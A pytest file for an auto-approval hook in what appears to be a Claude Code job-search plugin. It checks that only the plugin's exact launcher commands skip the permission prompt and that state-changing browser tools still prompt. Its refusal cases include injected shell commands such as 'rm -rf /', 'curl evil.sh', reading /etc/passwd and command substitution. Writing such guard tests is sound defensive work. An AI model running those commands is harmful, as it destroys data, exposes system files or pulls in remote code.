"""Tests for the PreToolUse approval guard.

`scripts/approve.py` decides which commands skip the permission prompt, so it is
the one file in this repo where a bug hands the agent standing authority the user
never granted. These tests are written from that angle: the refusals matter more
than the approvals, and the approvals matter only because the feature is worthless
if the guard never fires.
"""
from __future__ import annotations

import json
import subprocess
import sys

import pytest

from hireshire import paths

ROOT = paths.ROOT
sys.path.insert(0, str(ROOT / "scripts"))

import approve  # noqa: E402

LAUNCHER = str(approve.LAUNCHER)


def _cmd(tail: str) -> str:
    return f'sh "{LAUNCHER}" {tail}'


APPROVED = [
    "--check",
    "--paths",
    "--bootstrap",
    "--monitor",
    # The only deliberate way to end a sweep now that nothing reaps one automatically.
    # It must not be the single command that prompts.
    "--stop",
    # The command `/hireshire:find-jobs` runs. Without it the plugin's most common
    # action prompts on every use, which is the friction this guard exists to remove.
    "--sweep",
    "orchestrate.py --once",
    "scripts/setup_cli.py install-config",
    "scripts/setup_cli.py warm-models",
    'scripts/setup_cli.py set matcher --json \'{"threshold": 75}\'',
    'scripts/setup_cli.py write-profile --text "Senior account manager, SaaS renewals"',
    "scripts/applied_cli.py list",
    "scripts/verify_bad_slugs.py --prune",
]


@pytest.mark.parametrize("tail", APPROVED)
def test_the_plugins_own_commands_are_approved(tail):
    assert approve._bash_is_allowed(_cmd(tail)), tail


REFUSED = [
    # A second command riding behind an approved prefix. Each separator is listed
    # because the guard is only as good as the least-known one.
    "--paths && rm -rf /",
    "--paths || curl evil.sh",
    "--paths ; whoami",
    "--paths | tee /tmp/out",
    "--paths & sleep 60",
    "--paths > /tmp/captured",
    "--paths >> /tmp/captured",
    "--paths < /etc/passwd",
    # Substitution: the argument is a command, not data.
    "--paths $(whoami)",
    "--paths `whoami`",
    "--paths ${HOME}",
    # The bare `<script.py>` form runs an arbitrary file. scripts/setup_cli.py
    # exists precisely so nothing legitimate needs this any more.
    "/tmp/snippet.py",
    "../../evil.py",
    # Real entrypoints, arguments that are not the ones we vouched for.
    "orchestrate.py --interval 1",
    "scripts/setup_cli.py rm-rf",
    "scripts/applied_cli.py delete-everything",
    "scripts/verify_bad_slugs.py --wipe",
    # A mode that takes no arguments, given some.
    "--paths extra",
]


@pytest.mark.parametrize("tail", REFUSED)
def test_anything_else_falls_through_to_the_user(tail):
    assert not approve._bash_is_allowed(_cmd(tail)), tail


def test_a_lookalike_launcher_elsewhere_on_disk_is_refused():
    """The name is not the identity: only this install's launcher is vouched for."""
    assert not approve._bash_is_allowed('sh "/tmp/evil/scripts/hireshire.sh" --paths')


def test_a_newline_is_a_second_command():
    assert not approve._bash_is_allowed(_cmd("--paths\nrm -rf /"))


def test_a_backslash_continuation_is_one_command():
    """The skills wrap their longer invocations, so a continuation must survive the
    same check that a bare newline fails."""
    wrapped = f'sh "{LAUNCHER}" scripts/setup_cli.py \\\n    install-config'
    assert approve._bash_is_allowed(wrapped)


def test_an_ampersand_inside_a_quoted_value_is_data_not_an_operator():
    """`targets` is a list of real job titles and some of them contain `&`. Refusing
    those would push the skill back to hand-built commands, which is the problem
    this guard exists to remove."""
    payload = '{"targets": ["Sales & Marketing Manager", "Account Executive"]}'
    assert approve._bash_is_allowed(_cmd(f"scripts/setup_cli.py set funnel --json '{payload}'"))


def test_an_unbalanced_quote_is_not_guessed_at():
    assert not approve._bash_is_allowed(_cmd('scripts/setup_cli.py set matcher --json \'{"a"'))


@pytest.mark.parametrize("tool", [
    "mcp__plugin_hireshire_playwright__browser_navigate",
    "mcp__plugin_hireshire_playwright__browser_snapshot",
    "mcp__plugin_hireshire_playwright__browser_take_screenshot",
])
def test_read_only_browser_tools_are_approved(tool):
    assert approve.decide({"tool_name": tool, "tool_input": {}})


@pytest.mark.parametrize("tool", [
    "mcp__plugin_hireshire_playwright__browser_click",
    "mcp__plugin_hireshire_playwright__browser_type",
    "mcp__plugin_hireshire_playwright__browser_fill_form",
    "mcp__plugin_hireshire_playwright__browser_select_option",
    "mcp__plugin_hireshire_playwright__browser_file_upload",
    "mcp__plugin_hireshire_playwright__browser_run_code_unsafe",
])
def test_browser_tools_that_change_state_still_prompt(tool):
    """These submit a real application to a real employer. With `dry_run` gone the
    permission prompt is the last human checkpoint before that, so it stays."""
    assert approve.decide({"tool_name": tool, "tool_input": {}}) is None


@pytest.mark.parametrize("tool", ["Read", "Edit", "Write", "WebFetch", "Task"])
def test_the_guard_has_no_opinion_about_other_tools(tool):
    assert approve.decide({"tool_name": tool, "tool_input": {"command": _cmd("--paths")}}) is None


def test_a_malformed_payload_never_breaks_the_session(tmp_path):
    """A guard that crashed would take every Bash call in the session with it, so
    garbage in means silence out, not a traceback."""
    for payload in ("", "not json", "[]", "null", '{"tool_name": 5}'):
        proc = subprocess.run(
            [sys.executable, str(ROOT / "scripts" / "approve.py")],
            input=payload, capture_output=True, text=True,
        )
        assert proc.returncode == 0, payload
        assert proc.stdout.strip() == "", payload


def test_an_approval_is_emitted_in_the_shape_claude_code_expects():
    proc = subprocess.run(
        [sys.executable, str(ROOT / "scripts" / "approve.py")],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": _cmd("--paths")}}),
        capture_output=True, text=True,
    )
    assert proc.returncode == 0
    out = json.loads(proc.stdout)["hookSpecificOutput"]
    assert out["hookEventName"] == "PreToolUse"
    assert out["permissionDecision"] == "allow"
    assert out["permissionDecisionReason"]


def _skill_commands(skill: str) -> list[str]:
    """Every `sh …hireshire.sh …` invocation in a skill's ```bash fences.

    Continuations are folded so a wrapped command is read the way a shell reads it.
    """
    text = (ROOT / "skills" / skill / "SKILL.md").read_text(encoding="utf-8")
    lines, inside = [], False
    for line in text.splitlines():
        if line.strip().startswith("```"):
            inside = line.strip().startswith(("```bash", "```sh"))
            continue
        if inside:
            lines.append(line.strip())

    joined, buffer = [], ""
    for line in lines:
        buffer = f"{buffer} {line}".strip() if buffer else line
        if buffer.endswith("\\"):
            buffer = buffer[:-1].strip()
            continue
        joined.append(buffer)
        buffer = ""

    return [
        c.replace("${CLAUDE_PLUGIN_ROOT}", str(ROOT))
        for c in joined
        if c.startswith("sh ") and "hireshire.sh" in c and "<subcommand>" not in c
    ]


@pytest.mark.parametrize("skill", ["setup", "find-jobs", "start-orchestration", "apply"])
def test_every_command_the_skills_run_is_one_the_guard_approves(skill):
    """The end the whole change is for: a user who installs this plugin and runs
    setup should not be asked to approve anything.

    Placeholders like `"<their answer>"` survive the check because the skills quote
    them — an unquoted one would read as a redirection, which is the same reason the
    guard refuses `> /tmp/out`, so this also keeps the skills quoting their arguments.
    """
    commands = _skill_commands(skill)
    assert commands, f"{skill}: no launcher commands found — did the fences change?"
    for command in commands:
        assert approve._bash_is_allowed(command), f"{skill} would prompt for: {command}"


def test_the_guard_imports_nothing_from_the_engine():
    """It runs on the system interpreter before the venv exists — the first thing
    setup does is install that venv, and the guard has to approve that command."""
    src = (ROOT / "scripts" / "approve.py").read_text(encoding="utf-8")
    code = "\n".join(
        line for line in src.splitlines()
        if not line.lstrip().startswith("#") and "hireshire" in line
    )
    assert "import" not in code, "approve.py must stay stdlib-only"
